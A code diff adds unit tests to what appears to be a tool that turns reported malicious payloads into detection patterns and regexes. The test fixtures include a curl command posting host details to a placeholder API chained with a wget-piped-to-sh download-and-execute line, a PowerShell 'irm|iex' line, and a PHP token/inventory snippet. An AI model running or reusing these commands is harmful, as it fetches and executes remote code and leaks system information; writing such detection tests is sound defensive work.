@@ -1,4 +1,5 @@
 import json
+import re
 import tempfile
 import unittest
 import urllib.error
@@ -480,6 +481,75 @@ class PatternTests(unittest.TestCase):
             'echo file.msi\nWrite-Output "A  B"',
         )
 
+    def telemetry(self, client_id, host, timestamp, downloader="wget -qO-"):
+        return (
+            f'curl -sL -d "id={client_id}&location=Europe%2FAmsterdam'
+            f'&siteUrl=https%3A%2F%2F{host}%2F&os=Linux%20x86_64'
+            f'&lastVisitAt={timestamp}&lastShellAt={timestamp}" '
+            f'"https://api.example/x" && {downloader} \'https://stage.example/x\' -L | sh'
+        )
+
+    def test_curl_telemetry_groups_only_targeted_fields(self):
+        first = self.telemetry(
+            "0048088b-86c5-4092-8adf-ae27e12f8b11", "one.example",
+            "2026-11-11T14%3A45%3A29.831Z",
+        )
+        second = self.telemetry(
+            "00dcc813-bf10-4981-811a-b33bb554bee6", "two.example",
+            "2026-11-12T12:04:08.183Z",
+        )
+        patterns = exporter.build_patterns([
+            self.entry("a", first), self.entry("b", second),
+        ])
+        self.assertEqual(len(patterns), 1)
+        pattern = patterns[0]["Pattern"]
+        self.assertIn("id=<UUID>", pattern)
+        self.assertIn("siteUrl=<ENCODED_URL>", pattern)
+        self.assertIn("lastVisitAt=<TIMESTAMP>", pattern)
+        self.assertIn("os=Linux%20x86_64", pattern)
+        regex = exporter.build_regex_patterns(patterns)[0]["Regex"]
+        self.assertIsNotNone(re.search(regex, first))
+        self.assertIsNotNone(re.search(regex, second))
+        self.assertIsNone(re.search(regex, second.replace("| sh", "| cat")))
+        self.assertIsNone(re.search(regex, second.replace("wget -qO-", "curl -fsSL")))
+        self.assertIsNone(re.search(regex, second.replace("Linux%20x86_64", "Windows")))
+        self.assertEqual(
+            exporter.normalize_payload('$id="123";echo "siteUrl=https%3A%2F%2Fx.example"'),
+            '$id="123";echo "siteUrl=https%3A%2F%2Fx.example"',
+        )
+
+    def test_php_inventory_preserves_code_and_groups_token_id_and_layout(self):
+        first = (
+            "$tok='abc_DEF';$id='ab1234';$interval=420; "
+            "function _ea_inv($cfg){ $r=array('php'=>PHP_VERSION); }"
+        )
+        second = first.replace("abc_DEF", "xyz_789").replace("ab1234", "de5678").replace("; ", ";\n")
+        patterns = exporter.build_patterns([
+            self.entry("a", first), self.entry("b", second),
+        ])
+        self.assertEqual(len(patterns), 1)
+        result = exporter.build_regex_patterns(patterns)[0]
+        self.assertNotIn("ReportIds", result)
+        self.assertEqual(patterns[0]["ReportIds"], ["a", "b"])
+        self.assertEqual(result["Family"], "PHP inventory")
+        self.assertEqual(result["Target"], "Server-side content")
+        self.assertIsNotNone(re.search(result["Regex"], second))
+        self.assertIsNone(re.search(result["Regex"], second.replace("420", "421")))
+        self.assertIsNone(re.search(result["Regex"], second.replace("PHP_VERSION", "OTHER")))
+        self.assertEqual(
+            exporter.normalize_payload("$tok='abc';$id='123';echo 1;"),
+            "$tok='abc';$id='123';echo 1;",
+        )
+
+    def test_regex_escapes_literals_and_rejects_unmatched_examples(self):
+        patterns = exporter.build_patterns([self.entry("a", 'echo "A+B[0].*"')])
+        regex = exporter.build_regex_patterns(patterns)[0]["Regex"]
+        self.assertIsNotNone(re.search(regex, 'echo "A+B[0].*"'))
+        self.assertIsNone(re.search(regex, 'echo "AAAB0anything"'))
+        patterns[0]["Pattern"] = "unrelated"
+        with self.assertRaisesRegex(ValueError, "does not match"):
+            exporter.build_regex_patterns(patterns)
+
     def test_includes_all_families_singletons_and_long_payloads(self):
         entries = [
             self.entry("a", "irm 'https://a.example/x'|iex"),
@@ -536,12 +606,17 @@ class PatternTests(unittest.TestCase):
                 json.loads((output / "Patterns.json").read_text(encoding="utf-8")),
                 patterns,
             )
+            self.assertEqual(
+                json.loads((output / "Patterns.regex.json").read_text(encoding="utf-8")),
+                [item["Regex"] for item in exporter.build_regex_patterns(patterns)],
+            )
             with patch.object(Path, "write_text") as write:
                 exporter.write_patterns(output, patterns)
                 write.assert_not_called()
             exporter.write_patterns(output, [])
             self.assertEqual((output / "Patterns.txt").read_text(), "")
             self.assertEqual(json.loads((output / "Patterns.json").read_text()), [])
+            self.assertEqual(json.loads((output / "Patterns.regex.json").read_text()), [])
 
     def test_export_generates_patterns_from_same_seven_day_set(self):
         with tempfile.TemporaryDirectory() as directory:
